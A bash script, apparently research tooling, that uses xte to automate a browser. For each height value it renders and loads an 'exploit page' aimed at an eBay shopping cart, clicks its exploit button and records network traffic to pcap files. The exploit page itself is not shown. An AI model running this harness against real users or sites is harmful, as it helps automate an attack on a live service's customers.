#!/bin/bash

MIN_HEIGHT=$1
MAX_HEIGHT=$2
HEIGHT_STEP=$3


#New Tab
new_tab(){
	xte 'keydown Control_L'
	xte 'key t'
	xte 'keyup Control_L'
	sleep 5
}

#Close Tab
close_tab(){
	xte 'keydown Control_L'
	xte 'key w'
	xte 'keyup Control_L'
	sleep 5
}

#Load the exploit page
load_exploit_page(){
	xte 'str file:///shopping_cart_exploit.html'
	sleep 2
	xte 'key Return'
	sleep 20
}

#Create the exploit page for a given height
render_exploit_page(){
	HEIGHT=$1
	python /ebay_shoppingcart/jinja_render_exploitpage.py $HEIGHT "exploit_$HEIGHT.html"
	cp "exploit_$HEIGHT.html" /shopping_cart_exploit.html
}

#Click the exploit button
click_exploit_button(){
	sleep 1
	xte 'mousemove 150 100'
	sleep 1
	xte 'mouseclick 1'
	sleep 1
}

#Main loop
for h in `seq $MIN_HEIGHT $HEIGHT_STEP $MAX_HEIGHT`
do
	#Render the exploit page
	render_exploit_page $h
	
	sleep 5
	
	#Open a new private tab
	new_tab
	
	#Load the exploit page
	load_exploit_page
	
	sleep 5
	
	#Begin recording network traffic
	./capture_command.sh &
	capture_pid=$!
	sleep 10
	
	#Click the exploit button
	click_exploit_button
	
	sleep 40
	
	#Stop recording network traffic and save it
	pkill -P $capture_pid
	sleep 5
	
	#Save the network traffic capture
	mv captured_packets.pcap exploit_height_$h.pcap
	
	sleep 5
	
	#Close the current tab
	close_tab
	
	sleep 5

done
	
	
